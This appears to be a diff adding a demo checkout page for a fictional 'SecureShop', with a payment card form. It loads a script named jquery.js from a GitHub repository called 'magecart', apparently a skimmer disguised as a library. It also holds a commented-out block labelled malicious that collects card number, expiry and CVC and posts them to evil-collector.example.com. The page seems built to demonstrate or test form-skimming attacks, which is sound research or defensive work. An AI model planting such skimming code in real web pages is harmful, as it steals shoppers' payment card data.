@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script
+      src="https://us.gimp.zeronaught.com/__imp_apg__/js/volt-accessq_nfr_unwtrrga-b5e67bf4.js"
+      id="_imp_apg_dip_"
+      _imp_apg_cid_="volt-accessq_nfr_unwtrrga-b5e67bf4"
+      _imp_apg_api_domain_="https://us.gimp.zeronaught.com"
+    ></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SecureShop - Checkout</title>
+
+    <style>
+      /* tus estilos */
+    </style>
+  </head>
+  <body>
+    <form id="payment-form">
+      <input name="cc_number" placeholder="Card Number" />
+      <input name="cc_exp" placeholder="MM/YY" />
+      <input name="cc_cvc" placeholder="CVC" />
+      <button id="payBtn">Pay Now</button>
+    </form>
+    <script src="https://raw.githubusercontent.com/ocpdata/magecart/refs/heads/main/jquery.js"></script>
+    <script>
+      /*// Malicious injected JavaScript – captures user form data
+      document
+        .getElementById("payment-form")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+          const formData = {};
+          for (let el of this.elements) {
+            if (el.name) formData[el.name] = el.value;
+          }
+          // Exfiltration – sends card data to attacker's server
+          fetch("https://evil-collector.example.com/steal", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(formData),
+          });
+        });*/
+    </script>
+  </body>
+</html>
